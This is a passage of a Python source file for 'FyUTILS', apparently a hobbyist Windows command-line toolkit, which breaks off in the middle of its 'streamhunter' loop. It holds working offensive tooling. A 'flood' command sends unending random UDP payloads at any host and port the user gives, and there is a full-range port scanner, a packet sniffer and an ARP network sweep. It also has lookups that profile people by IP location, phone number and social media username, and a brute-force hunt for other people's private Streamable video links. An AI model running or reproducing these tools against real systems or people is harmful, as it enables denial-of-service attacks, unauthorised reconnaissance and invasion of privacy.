import datetime
import json
import multiprocessing
import os
import platform
import random
import shutil
import socket
import subprocess
import sys
import time
import traceback
import paramiko
import phonenumbers
import psutil
import pwinput
import requests
import string
from pathlib import Path
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.inet6 import IPv6
from scapy.packet import Packet
from packaging import version as version_parser
from scapy.layers.l2 import ARP, Ether, srp
from scapy.all import sniff
from colorama import Fore, Back, init
from phonenumbers import geocoder, carrier, timezone
from pypresence import Presence
from pytube import YouTube

init(convert=True)
CURRENT_FYUTILS_VERSION = "1.11.0"


def prefix(level: str = "INFO"):
    if level == "INFO":
        return background_colors["BLUE"] + " " + colors["BLACK"] + level + colors["RESET"] + " " + background_colors["RESET"] + " " + colors["WHITE"]
    elif level == "WARN":
        return background_colors["YELLOW"] + " " + colors["BLACK"] + level + colors["RESET"] + " " + background_colors["RESET"] + " " + colors["WHITE"]
    elif level == "ERROR":
        return background_colors["RED"] + " " + colors["BLACK"] + level + colors["RESET"] + " " + background_colors["RESET"] + " " + colors["WHITE"]
    elif level == "DEBUG":
        return background_colors["MAGENTA"] + " " + colors["BLACK"] + level + colors["RESET"] + " " + background_colors["RESET"] + " " + colors["WHITE"]
    else:
        return background_colors["BLUE"] + " " + colors["BLACK"] + level + colors["RESET"] + " " + background_colors["RESET"] + " " + colors["WHITE"]


def execute(command: str):
    subprocess.call(command, shell=True)


def exec_code(command: str):
    return subprocess.call(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


def version_is_newer(current: str, target: str):
    current_version = version_parser.parse(current)
    target_version = version_parser.parse(target)
    return current_version < target_version


def update_status(status: str):
    execute("title FyUTILS " + version + " - " + username + "@" + device + " - " + status)
    try:
        rpc.update(
            state=status, details=username + "@" + device, small_image="python",
            large_image="fyutils",
            buttons=[{"label": "Get FyUTILS", "url": "https://github.com/NoahOnFyre/FyUTILS/releases/latest"},
                     {"label": "View Project", "url": "https://github.com/NoahOnFyre/FyUTILS/"}],
            small_text="Python", large_text="FyUTILS v" + version,
            start=int(start_time))
    except:
        None


def update_ssh_status(status: str):
    execute("title FyUTILS " + version + " - " + user + "@" + server + " - " + status)
    try:
        rpc.update(
            state="[REMOTE] " + status, details=user + "@" + server, small_image="ssh",
            large_image="fyutils",
            buttons=[{"label": "Get FyUTILS", "url": "https://github.com/NoahOnFyre/FyUTILS/releases/latest"},
                     {"label": "View Project", "url": "https://github.com/NoahOnFyre/FyUTILS/"}],
            small_text="Python", large_text="FyUTILS v" + version,
            start=int(start_time))
    except:
        None


def print_packet(packet: Packet):
    packet_src = ""
    packet_dst = ""
    if packet.haslayer(IP):
        packet_src = str(packet[IP].src)
        packet_dst = str(packet[IP].dst)
        protocol = "IP"
    if packet.haslayer(IPv6):
        packet_src = str(packet[IPv6].src)
        packet_dst = str(packet[IPv6].dst)
        protocol = "IPv6"
    if packet.haslayer(TCP):
        protocol = "TCP"
    elif packet.haslayer(UDP):
        protocol = "UDP"
    else:
        print(prefix("WARN") + "Can't read package.")
        return
    packet_prefix = background_colors["BLUE"] + " " + colors["BLACK"] + protocol + " " + background_colors["RESET"] + colors["WHITE"] + " "
    print(prefix() + packet_prefix + packet_src + " -> " + packet_dst)


def highlight_file(path: str):
    execute("explorer.exe /select,\"" + path + "\"")


def get_fuels():
    fuel_list = os.listdir(fuel_content_dir)
    for fuel in fuel_list:
        if os.path.isdir(fuel):
            fuel_list.remove(fuel)
            continue
        fuel.replace(fuel_content_dir, "")
    return fuel_list


def run_fuel(command_name: str, args: list[str]):
    activity_start = time.time()
    update_status("Running FUEL \"" + command_name + "\"")
    fuel = open(fuel_content_dir + command_name + ".fuel", "r")
    exec(fuel.read())
    print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
    fuel.close()
    return fuel_content_dir + command_name + ".fuel"


def format_boolean(boolean: bool):
    if boolean:
        return colors["GREEN"] + "Yes"
    elif not boolean:
        return colors["RED"] + "No"
    else:
        return colors["RED"] + "Not available"


def pause(level: str = "INFO"):
    input(prefix(level.upper()) + "Press enter to continue. ")


def crash_log():
    temp = open(main_dir + "crash.log", mode="wb+")
    data = f"""FyUTILS Traceback Crash log @ {datetime.datetime.now().strftime("%H:%M:%S")}

================================================================================

Variable stacktrace:
    - User specific:
        └> Username: {username}
        └> Device: {device}
        └> Hardware-ID: {hwid}
        └> Start time: {start_time}
        └> Directory: {current_dir}
        └> Version: {version}
        └> Thread count: {threads}
        └> Private IP: {private_ip}
    
    - Operating System specific:
        └> Operating System: {operating_system}
        └> Operating System version: {os_version}
    
    - Python specific:
        └> Python version: {python_version}
        
================================================================================
        
Python traceback:
{traceback.format_exc()}
"""

    temp.write(data.encode())
    temp.close()
    highlight_file(main_dir + "crash.log")


def menu():
    execute("cls")
    print(colors["BLUE"] + "  __________               _____  __   ________   ________   ______       ________")
    print(colors["BLUE"] + "  ___  ____/  _____  __    __  / / /   ___  __/   ____  _/   ___  /       __  ___/")
    print(colors["BLUE"] + "  __  /_      __  / / /    _  / / /    __  /       __  /     __  /        _____ \\ ")
    print(colors["BLUE"] + "  _  __/      _  /_/ /     / /_/ /     _  /       __/ /      _  /___      ____/ / ")
    print(colors["BLUE"] + "  /_/         _\\__, /      \\____/      /_/        /___/      /_____/      /____/  ")
    print(colors["BLUE"] + "             ___/  /")
    print(colors["BLUE"] + "            /_____/ " + " "*5 + colors["GRAY"] + "v" + colors["WHITE"] + version.replace(".", colors["GRAY"] + "." + colors["WHITE"]) + colors["GRAY"] + " | " + colors["WHITE"] + "Made by NoahOnFyre")
    print()
    print(colors["GRAY"] + "╔" + "═"*119)
    print(colors["GRAY"] + "║ " + colors["WHITE"] + "Username" + colors["GRAY"] + ": " + colors["BLUE"] + username)
    print(colors["GRAY"] + "║ " + colors["WHITE"] + "Device" + colors["GRAY"] + ":   " + colors["BLUE"] + device.replace("-", colors["GRAY"] + "-" + colors["BLUE"]))
    print(colors["GRAY"] + "║ " + colors["WHITE"] + "Version" + colors["GRAY"] + ":  " + colors["BLUE"] + version.replace(".", colors["GRAY"] + "." + colors["BLUE"]))
    if update_available:
        print(colors["GRAY"] + "╠" + "═"*119)
        print(colors["GRAY"] + "║ " + colors["WHITE"] + "A new version of FyUTILS is available!")
        for item in str(update_content).split("\r\n"):
            if not item.startswith("**Full Changelog**:"):
                if not item == "":
                    print(colors["GRAY"] + "║ " + colors["WHITE"] + item)
        print(colors["GRAY"] + "║ " + colors["WHITE"])
        print(colors["GRAY"] + "║ " + colors["WHITE"] + colors["RED"] + version + colors["GRAY"] + " => " + colors["GREEN"] + newest_version + colors["GRAY"] + " | " + colors["WHITE"] + "Run \"update\" to update your instance.")
    print(colors["GRAY"] + "╚" + "═"*119)


# INIT PHASE
execute("title FyUTILS - Initialization phase")

# Scapy stuff
packet_src = ""
packet_dst = ""

# Color initialisation
colors = {
    "RED": Fore.RED,
    "BLUE": Fore.BLUE,
    "GREEN": Fore.GREEN,
    "YELLOW": Fore.YELLOW,
    "MAGENTA": Fore.MAGENTA,
    "CYAN": Fore.CYAN,
    "BLACK": Fore.BLACK,
    "WHITE": Fore.WHITE,
    "GRAY": Fore.LIGHTBLACK_EX,
    "RESET": Fore.RESET
}

background_colors = {
    "RED": Back.RED,
    "BLUE": Back.BLUE,
    "GREEN": Back.GREEN,
    "YELLOW": Back.YELLOW,
    "MAGENTA": Back.MAGENTA,
    "CYAN": Back.CYAN,
    "BLACK": Back.BLACK,
    "WHITE": Back.WHITE,
    "GRAY": Back.LIGHTBLACK_EX,
    "RESET": Back.RESET
}

# Variable initialisation
try:
    # User specific stuff
    print(prefix("INFO") + "Initializing system variables...")
    username = os.getlogin()
    print(prefix("INFO") + "Username: " + username)
    device = platform.node()
    print(prefix("INFO") + "Device: " + device)
    hwid = str(subprocess.check_output("wmic csproduct get uuid",), "UTF-8").split("\n")[1].strip()
    print(prefix("INFO") + "Hardware ID: " + hwid)
    start_time = time.time()
    print(prefix("INFO") + "Start time: " + str(start_time))
    current_dir = sys.path[0]
    print(prefix("INFO") + "Directory: " + current_dir)
    version = CURRENT_FYUTILS_VERSION
    print(prefix("INFO") + "Version: " + version)
    threads = multiprocessing.cpu_count()
    print(prefix("INFO") + "ThreadWorkers: " + str(threads))
    private_ip = socket.gethostbyname(socket.gethostname())
    print(prefix("INFO") + "Private IP: " + private_ip)
    wire_started = False
    print(prefix("INFO") + "WIRE started: " + format_boolean(wire_started))

    # OS specific stuff.
    operating_system = platform.system()
    print(prefix("INFO") + "Operating System: " + operating_system)
    os_version = platform.version()
    print(prefix("INFO") + "OS version: " + os_version)

    # Python specific stuff
    python_version = platform.python_version()
    print(prefix("INFO") + "Python version: " + python_version)

    # Directory specific stuff
    user_dir = str(Path.home())
    print(prefix("INFO") + "User specific directory: " + user_dir)
    appdata_dir = user_dir + "\\AppData\\"
    print(prefix("INFO") + "AppData directory: " + appdata_dir)
    main_dir = appdata_dir + "Roaming\\FyUTILS\\"
    print(prefix("INFO") + "FyUTILS AppData directory: " + main_dir)
    tmp_dir = main_dir + "tmp\\"
    print(prefix("INFO") + "Temp files directory: " + tmp_dir)
    download_content_dir = main_dir + "content\\"
    print(prefix("INFO") + "Download Content Location: " + download_content_dir)
    fuel_content_dir = main_dir + "fuels\\"
    print(prefix("INFO") + "FUEL Content Location: " + fuel_content_dir)
    proxy_config_dir = main_dir + "proxies\\"
    print(prefix("INFO") + "Proxy configurations: " + proxy_config_dir)

    # Create directories if they not exist.
    if not os.path.exists(main_dir):
        os.makedirs(main_dir)
        print(prefix("WARN") + "Main directory didn't existed and has been created.")
        time.sleep(1)
    if not os.path.exists(tmp_dir):
        os.makedirs(tmp_dir)
        print(prefix("WARN") + "Temporary storage directory didn't existed and has been created.")
        time.sleep(1)
    if not os.path.exists(download_content_dir):
        os.makedirs(download_content_dir)
        print(prefix("WARN") + "Download content directory didn't existed and has been created.")
        time.sleep(1)
    if not os.path.exists(fuel_content_dir):
        os.makedirs(fuel_content_dir)
        print(prefix("WARN") + "FUEL content directory didn't existed and has been created.")
        time.sleep(1)
    if not os.path.exists(proxy_config_dir):
        os.makedirs(proxy_config_dir)
        print(prefix("WARN") + "Proxy config directory didn't existed and has been created.")
        time.sleep(1)

    # URL specific stuff
    releases = "https://api.github.com/repos/NoahOnFyre/FyUTILS/releases"
    print(prefix("INFO") + "Releases URL: " + releases)
    fuel_repository = "https://api.github.com/repos/NoahOnFyre/FUELS/contents/"
    print(prefix("INFO") + "FUEL repository content URL: " + fuel_repository)

    # System components specific stuff
    cpu = platform.processor()
    print(prefix("INFO") + "CPU: " + cpu)
    memory_amount = psutil.virtual_memory().total
    print(prefix("INFO") + "Memory amount: " + str(round(memory_amount / 1024 / 1024)) + "MB")
except Exception as e:
    print(prefix("ERROR") + "Failed to get system variables!")
    print(traceback.format_exc())
    print(prefix("ERROR") + "Shutting down...")
    pause("ERROR")
    sys.exit(2048)

# Update checker
print(prefix("INFO") + "Checking for updates...")
try:
    releases_json = requests.get(releases).json()
    newest_release = releases_json[0]
    for r in range(len(newest_release["assets"])):
        release_download_url = ""
        if newest_release["assets"][r]["name"] == "main.py":
            release_download_url = newest_release["assets"][r]["browser_download_url"]
            break
        else:
            release_download_url = ""
            continue
    update_content = newest_release["body"]
    newest_version = newest_release["tag_name"]
    if version_is_newer(version, newest_version):
        print(prefix("INFO") + "A new version of FyUTILS is available!")
        print(prefix("INFO") + "Current version identifier: " + version)
        print(prefix("INFO") + "Newest version identifier: " + newest_version)
        update_available = True
    else:
        print(prefix("INFO") + "No update found!")
        print(prefix("INFO") + "Current version identifier: " + version)
        print(prefix("INFO") + "Newest version identifier: " + newest_version)
        update_available = False
except Exception as e:
    print(prefix("WARN") + "Checking for updates failed. Please check your internet connection.")
    print(prefix("WARN") + "You won't receive any updates without internet connection.")
    update_available = False

# Discord RPC initialisation
try:
    print(prefix("INFO") + "Setting presence ID...")
    presence_id = "1005822803997638696"
    print(prefix("INFO") + "Presence ID set to: \"" + presence_id + "\".")
    print(prefix("INFO") + "Initializing discord rich presence...")
    rpc = Presence(presence_id)
    print(prefix("INFO") + "Connecting to discord...")
    rpc.connect()
    print(prefix("INFO") + "Discord is connected...")
    update_status("Starting up...")
except Exception:
    print(prefix("WARN") + "Can't connect with the discord RPC.")
    time.sleep(0.25)

print(prefix("INFO") + "Initialisation phase completed!")
update_status("Initialisation phase completed!")

# INIT PHASE END

menu()
try:
    while True:
        print()
        update_status("Idle")
        try:
            if os.getcwd() == current_dir:
                cwd_abbreviation = "#"
            elif os.getcwd() == "C:\\":
                cwd_abbreviation = "/"
            elif os.getcwd() == user_dir:
                cwd_abbreviation = "~"
            elif os.getcwd() == appdata_dir:
                cwd_abbreviation = "@"
            else:
                cwd_abbreviation = os.getcwd()
            request_raw = input(colors["GRAY"] + "╔═══[" + colors["BLUE"] + username + colors["GRAY"] + "@" + colors["WHITE"] + device + colors["GRAY"] + "]══(" + colors["BLUE"] + "FyUTILS" + colors["GRAY"] + "/" + colors["WHITE"] + version + colors["GRAY"] + ")══[" + colors["WHITE"] + cwd_abbreviation + colors["GRAY"] + "]\n" +
                                colors["GRAY"] + "╚═══> " + colors["WHITE"])
            request = request_raw.split(" ")
            cmd = request[0].lower()
            request.__delitem__(0)
            args = request
            print()
        except KeyboardInterrupt:
            try:
                update_status("Shutting down...")
                print("\n" + prefix() + "Shutting down FyUTILS...")
                time.sleep(1)
                sys.exit(0)
            except KeyboardInterrupt:
                continue

        match cmd:
            case "flood":
                if len(args) < 2:
                    print(prefix("ERROR") + "Unexpected arguments for command \"" + cmd + "\"")
                    continue
                target = args[0]
                port = int(args[1])
                activity_start = time.time()
                update_status("Flooding " + target + ":" + str(port))

                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.connect((target, port))
                    for i in range(sys.maxsize):
                        try:
                            sock.send(random.randbytes(10240))
                            print(prefix() + "Attacking target: " + colors["BLUE"] + target + colors["GRAY"] + ":" + colors["BLUE"] + str(port) + colors["WHITE"] + "..." + colors["GRAY"] + " - " + colors["WHITE"] + "Attack: " + colors["BLUE"] + str(i + 1) + colors["GRAY"], end="\r")
                        except socket.error:
                            print()
                            print(prefix("WARN") + "Request " + colors["BLUE"] + str(i) + colors["WHITE"] + " failed.", end="\r")
                    print("\n")
                except KeyboardInterrupt:
                    print("\n" + prefix() + "Canceling Action...")
                    print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                except Exception as e:
                    print("\n" + prefix("ERROR") + "An error occurred while trying to execute this command correctly.")
                    print(prefix("ERROR") + str(e))
                    print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                try:
                    sock.close()
                except Exception:
                    print(prefix("WARN") + "Cannot disconnect from target!")

            case "portscan":
                if len(args) < 1:
                    print(prefix("ERROR") + "Unexpected arguments for command \"" + cmd + "\"")
                    continue
                target = args[0]
                activity_start = time.time()
                update_status("Scanning on " + target)

                try:
                    print(prefix() + "Preparing scan...")
                    for port in range(1, 65535):
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        socket.setdefaulttimeout(1/1000)
                        result = sock.connect_ex((target, port))
                        print(prefix() + "Scanning Port... " + colors["BLUE"] + str(port), end="\r")
                        if result == 0:
                            print(prefix() + "Port " + colors["BLUE"] + str(port) + colors["WHITE"] + " is open!" + " "*50)
                        sock.close()
                    print("\n")
                except KeyboardInterrupt:
                    print("\n" + prefix() + "Canceling Action...")
                    print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                except Exception as e:
                    print("\n" + prefix("ERROR") + "An error occurred while trying to execute this command correctly.")
                    print(prefix("ERROR") + str(e))
                    print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                try:
                    sock.close()
                except Exception:
                    print(prefix("WARN") + "Cannot disconnect from target!")

            case "sniff" | "traffic":
                update_status("Sniffing network...")
                activity_start = time.time()

                print(prefix() + "Starting network sniffer...")
                sniff(prn=print_packet)
                print(prefix() + "Canceling Action...")
                print(prefix() + "Stopping network sniffer...")
                print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")

            case "wire":
                if len(args) < 1:
                    print(prefix("ERROR") + "Unexpected arguments for command \"" + cmd + "\"")
                    continue
                action = args[0]
                update_status("Running WIRE")

                activity_start = time.time()

                if action == "start":
                    print(prefix("INFO") + "Starting WIRE service...")
                    if not wire_started:
                        if exec_code("netsh wlan show drivers") == 1:
                            wire_started = False
                            print(prefix("ERROR") + "WIRE can't be executed on your device.")
                        else:
                            wire_started = True
                            print(prefix("INFO") + "WIRE service started successfully!")
                    else:
                        wire_started = False
                        print(prefix("ERROR") + "WIRE service is already running!")
                        print(prefix("ERROR") + "You can restart it using \"wire restart\".")
                elif action == "connect":
                    if len(args) < 2:
                        print(prefix("ERROR") + "Unexpected arguments for command \"" + cmd + "\"")
                        continue
                    if not wire_started:
                        print(prefix("ERROR") + "WIRE service isn't running!")
                        continue
                    target = args[1]
                    execute("netsh wlan connect name=" + target)
                elif action == "stop":
                    if not wire_started:
                        wire_started = True
                        print(prefix("ERROR") + "WIRE service isn't running!")
                    else:
                        wire_started = False
                        print(prefix("INFO") + "WIRE service stopped successfully!")

            case "resolve":
                if len(args) < 2:
                    print(prefix("ERROR") + "Unexpected arguments for command \"" + cmd + "\"")
                    continue
                action = args[0]
                target = args[1]
                activity_start = time.time()
                update_status("Resolving information about " + target)

                if action == "ip":
                    data = json.loads(requests.get("http://ipwho.is/" + socket.gethostbyname(target)).content.decode())
                    print(prefix() + "Resolved information of \"" + data["ip"] + "\"")
                    print(prefix() + "IP: " + data["ip"])
                    print(prefix() + "IP type: " + data["type"])
                    print(prefix() + "Continent: " + data["continent"])
                    print(prefix() + "Country: " + data["country"])
                    print(prefix() + "Region: " + data["region"])
                    print(prefix() + "City: " + data["city"])
                    print(prefix() + "Latitude: " + str(data["latitude"]))
                    print(prefix() + "Longitude: " + str(data["longitude"]))
                    print(prefix() + "Google Maps: " + f"https://www.google.com/maps/@{data['latitude']},{data['longitude']},10z")
                    print(prefix() + "EU country: " + format_boolean(data["is_eu"]))
                    print(prefix() + "Postal code: " + data["postal"])
                    print(prefix() + "System number (ASN): " + str(data["connection"]["asn"]))
                    print(prefix() + "Organisation (ORG): " + data["connection"]["org"])
                    print(prefix() + "Internet access provider (ISP): " + data["connection"]["isp"])
                    print(prefix() + "Domain: " + data["connection"]["domain"])
                    print(prefix() + "Timezone: " + data["timezone"]["id"])
                    print(prefix() + "UTC: " + data["timezone"]["utc"])
                elif action == "phone":
                    parsed_number = phonenumbers.parse(target)
                    location = geocoder.description_for_number(parsed_number, "en")
                    phone_carrier = carrier.name_for_number(parsed_number, "en")
                    zone = timezone.time_zones_for_number(parsed_number)
                    print(prefix() + "Resolved information of \"" + target + "\"")
                    print(prefix() + "Location: " + location)
                    print(prefix() + "Carrier: " + phone_carrier)
                    print(prefix() + "Timezone: " + str(zone))
                elif action == "socials":
                    found_accounts = []
                    social_account_sites = [
                        {"url": "https://www.facebook.com/{}", "name": "Facebook"},
                        {"url": "https://www.twitter.com/{}", "name": "Twitter"},
                        {"url": "https://www.instagram.com/{}", "name": "Instagram"},
                        {"url": "https://www.reddit.com/user/{}", "name": "Reddit"},
                        {"url": "https://www.linkedin.com/in/{}", "name": "LinkedIn"},
                        {"url": "https://www.github.com/{}", "name": "GitHub"},
                        {"url": "https://www.pinterest.com/{}", "name": "Pinterest"},
                        {"url": "https://www.tumblr.com/{}", "name": "Tumblr"},
                        {"url": "https://www.youtube.com/{}", "name": "Youtube"},
                        {"url": "https://soundcloud.com/{}", "name": "SoundCloud"},
                        {"url": "https://www.snapchat.com/add/{}", "name": "Snapchat"},
                        {"url": "https://www.tiktok.com/@{}", "name": "TikTok"},
                        {"url": "https://www.medium.com/@{}", "name": "Medium"},
                        {"url": "https://www.quora.com/profile/{}", "name": "Quora"},
                        {"url": "https://www.twitch.tv/{}", "name": "Twitch"},
                        {"url": "https://www.telegram.me/{}", "name": "Telegram"}
                    ]
                    print(prefix("WARN") + "Please consider, that this might output false information, if you're not logged in.")
                    for site in social_account_sites:
                        url = site["url"].format(target)
                        response = requests.get(url)
                        if response.status_code != 404:
                            print(prefix() + target + "'s " + site["name"] + "-Account: " + site["url"].format(target))
                        else:
                            print(prefix("WARN") + "This person has no " + site["name"] + " account!")

                else:
                    print(prefix("ERROR") + "Action is not supported!")

            case "arp":
                activity_start = time.time()
                update_status("ARP scanning in " + private_ip + "...")

                try:
                    print(prefix() + "Make sure you have WinPcap or Npcap installed!")
                    print(prefix() + "Initialising ARP service...")
                    arp = ARP(pdst=private_ip + "/24")
                    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
                    packet = ether/arp
                    print(prefix() + "Sending ARP packets...")
                    content = srp(packet, timeout=2, verbose=0)[0]
                    clients = []
                    print(prefix() + "Receiving data from " + private_ip + "...")
                    for sent, received in content:
                        clients += [[received.psrc, received.hwsrc]]
                    print(prefix() + "Processing received data...")
                    print(prefix() + "Data received and processed.")
                    client_count = len(clients)
                    for i in range(client_count):
                        print(prefix() + colors["GRAY"] + "[" + colors["BLUE"] + str(i) + colors["GRAY"] + "] " + colors["WHITE"] + "IP: " + clients[i][0] + " MAC: " + clients[i][1])
                except KeyboardInterrupt:
                    print(prefix() + "Canceling Action...")
                    print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                    print()
                except Exception as e:
                    print(prefix("ERROR") + "An error occurred while trying to execute this command correctly.")
                    print(prefix("ERROR") + str(e))
                    print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")

            case "vars":
                print(prefix("INFO") + "Listing up system variables...")
                time.sleep(0.5)
                print(prefix("INFO") + "Username: " + username)
                print(prefix("INFO") + "Device: " + device)
                print(prefix("INFO") + "Hardware ID: " + hwid)
                print(prefix("INFO") + "Start time: " + str(start_time))
                print(prefix("INFO") + "Directory: " + current_dir)
                print(prefix("INFO") + "Version: " + version)
                print(prefix("INFO") + "ThreadWorkers: " + str(threads))
                print(prefix("INFO") + "Private IP: " + private_ip)
                print(prefix("INFO") + "Operating System: " + operating_system)
                print(prefix("INFO") + "OS version: " + os_version)
                print(prefix("INFO") + "Python version: " + python_version)
                print(prefix("INFO") + "User specific directory: " + user_dir)
                print(prefix("INFO") + "AppData directory: " + appdata_dir)
                print(prefix("INFO") + "FyUTILS AppData directory: " + main_dir)
                print(prefix("INFO") + "Temp files directory: " + tmp_dir)
                print(prefix("INFO") + "Download Content Location: " + download_content_dir)
                print(prefix("INFO") + "FUEL Content Location: " + fuel_content_dir)
                print(prefix("INFO") + "Releases URL: " + releases)
                print(prefix("INFO") + "CPU: " + cpu)
                print(prefix("INFO") + "Memory amount: " + str(round(memory_amount / 1024 / 1024)) + "MB")

            case "checkport" | "portcheck":
                if len(args) < 2:
                    print(prefix("ERROR") + "Unexpected arguments for command \"" + cmd + "\"")
                    continue
                target = args[0]
                port = int(args[1])
                activity_start = time.time()
                update_status("Checking" + target + ":" + str(port))

                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    result = sock.connect_ex((target, port))
                    if result == 0:
                        print(prefix() + "Port " + colors["BLUE"] + str(port) + colors["WHITE"] + " is open!")
                    else:
                        print(prefix("WARN") + "Port " + colors["BLUE"] + str(port) + colors["WHITE"] + " is not open!")
                    sock.close()
                except KeyboardInterrupt:
                    print(prefix() + "Canceling Action...")
                    print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                    print()
                except Exception as e:
                    print(prefix("ERROR") + "An error occurred while trying to execute this command correctly.")
                    print(prefix("ERROR") + str(e))
                    print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                try:
                    sock.close()
                except Exception:
                    print(prefix("WARN") + "Cannot disconnect from target!")

            case "ssh":
                if len(args) < 3:
                    print(prefix("ERROR") + "Unexpected arguments for command \"" + cmd + "\"")
                    continue
                server = args[0]
                port = int(args[1])
                user = args[2]
                activity_start = time.time()
                update_status("Starting FySSH service...")

                print(prefix() + "Connecting to " + server + ":" + str(port) + " as " + user)
                print(prefix() + "Initialising SSH client...")
                ssh = paramiko.SSHClient()
                print(prefix() + "Loading host keys...")
                ssh.load_system_host_keys()
                print(prefix() + "Adding policy...")
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                print(prefix() + "Requesting user's password...")
                password = pwinput.pwinput(colors["WHITE"] + "Enter password" + colors["GRAY"] + " > " + colors["WHITE"], "*")
                print(prefix() + "Connecting...")
                print()
                try:
                    ssh.connect(server, port=port, username=user, password=password)
                    while True:
                        try:
                            update_ssh_status("Idle")
                            ssh_cmd = input(colors["GRAY"] + "╔═══[" + colors["MAGENTA"] + user + colors["GRAY"] + "@" + colors["MAGENTA"] + server + colors["GRAY"] + ":" + colors["MAGENTA"] + str(port) + colors["GRAY"] + "]═══(" + colors["BLUE"] + "FySSH" + colors["GRAY"] + "/" + colors["WHITE"] + version + colors["GRAY"] + ")" + "\n" + "╚═══" + colors["GRAY"] + "> " + colors["WHITE"])
                            if ssh_cmd == "exit":
                                print("\n" + prefix() + "Canceling Action...")
                                print(prefix() + f"Time elapsed: {time.time() - activity_start : 0.2f}s")
                                break
                            ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(ssh_cmd)
                            update_ssh_status("Running: " + ssh_cmd)
                            print()
                            for line in ssh_stdout.readlines():
                                print(prefix("INFO") + line, end="\r")
                            for line in ssh_stderr.readlines():
                                print(prefix("ERROR") + line, end="\r")
                        except KeyboardInterrupt:
                            print("\n" + prefix() + "Canceling Action...")
                            print(prefix() + f"Time elapsed: {time.time() - activity_start : 0.2f}s")
                            break
                        except Exception as e:
                            print("\n" + prefix("ERROR") + "An error occurred while trying to execute this command correctly.")
                            print(prefix("ERROR") + str(e))
                            print()
                except Exception as e:
                    print(prefix("ERROR") + "Can't connect to SSH host. Please make sure, that the requested port is open.")
                    print(prefix("ERROR") + "SSH error: " + str(e))
                    print(prefix() + f"Time elapsed: {time.time() - activity_start : 0.2f}s")
                    continue

                print(prefix() + f"Time elapsed: {time.time() - activity_start : 0.2f}s")
                print(prefix() + "Disconnecting from " + colors["BLUE"] + server + colors["GRAY"] + ":" + colors["BLUE"] + str(port) + colors["WHITE"] + "...")
                try:
                    ssh.close()
                except Exception:
                    print(prefix("WARN") + "Cannot disconnect from target!")

            case "fetch":
                if len(args) < 2:
                    print(prefix("ERROR") + "Unexpected arguments for command \"" + cmd + "\"")
                    continue
                url = args[0]
                filename = args[1]
                activity_start = time.time()
                update_status("Fetching: " + url)

                try:
                    print(prefix() + "Fetching " + url + "...")
                    fetch_content = requests.get(url).content
                    print(prefix() + "Content of " + url + " cached!")
                    if not os.path.exists(download_content_dir):
                        os.makedirs(download_content_dir)
                    print(prefix() + "Writing content of " + url + " from cache to local storage!")

                    try:
                        open(download_content_dir + "\\" + filename, mode="xb").write(fetch_content)
                        execute("start explorer.exe " + download_content_dir)
                    except Exception as e:
                        print("\n" + prefix("ERROR") + "Could not save content to file.")
                        print(prefix("ERROR") + str(e))
                        print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                        print()
                except KeyboardInterrupt:
                    print()
                    print("\n" + prefix() + "Canceling Action...")
                    print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                except Exception as e:
                    print("\n" + prefix("ERROR") + "An error occurred while trying to execute this command correctly.")
                    print(prefix("ERROR") + str(e))
                    print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                    print()

            case "youtube":
                if len(args) < 1:
                    print(prefix("ERROR") + "Unexpected arguments for command \"" + cmd + "\"")
                    continue
                url = args[0]
                activity_start = time.time()
                update_status("Downloading: " + url)

                try:
                    youtube = YouTube(url)
                    if not os.path.exists(download_content_dir):
                        os.makedirs(download_content_dir)
                        print(prefix() + "Media directory created!")
                    print(prefix() + "Download started!")
                    youtube.streams.get_highest_resolution().download(download_content_dir)
                    print(prefix() + f"Download finished in {time.time() - activity_start: 0.2f} seconds!")
                    execute("start explorer.exe " + download_content_dir)
                except KeyboardInterrupt:
                    print()
                    print("\n" + prefix() + "Canceling Action...")
                    print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                except Exception as e:
                    print("\n" + prefix("ERROR") + "An error occurred while trying to execute this command correctly.")
                    print(prefix("ERROR") + str(e))
                    print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                    print()

            case "log" | "crashes":
                update_status("Opening logs...")
                highlight_file(main_dir + "crash.log")

            case "dir" | "open":
                if len(args) < 1:
                    execute("explorer.exe " + os.getcwd())
                    continue
                path = args[0]

                match path:
                    case "~":
                        path = user_dir

                    case "#":
                        path = current_dir

                    case "@":
                        path = appdata_dir

                    case "/":
                        path = "C:\\"

                    case _:
                        path = path
                execute("explorer.exe " + path)

            case "config" | "configuration" | "settings" | "preferences":
                if len(args) < 1:
                    print(prefix("ERROR") + "Unexpected arguments for command \"" + cmd + "\"")
                    continue
                action = args[0]
                activity_start = time.time()
                update_status("Editing preferences...")
                print(prefix() + "The config system is currently maintained.")

            case "streamhunter":
                activity_start = time.time()
                update_status("Searching for videos...")

                print(prefix() + "Searching for videos...")
                while True:
                    try:
                        identifier = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(6)).lower()
                        time.sleep(0.5)
                        source = requests.get("https://streamable.com/" + identifier)
                        try:
                            if source.status_code != 404:
                                print(prefix() + "Valid link found! | https://streamable.com/" + identifier)
                        except Exception as e:
                            print(prefix("ERROR") + "An error occurred while trying to execute this command correctly.")
                            print(prefix("ERROR") + str(e))
                            print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                            break
                    except KeyboardInterrupt:
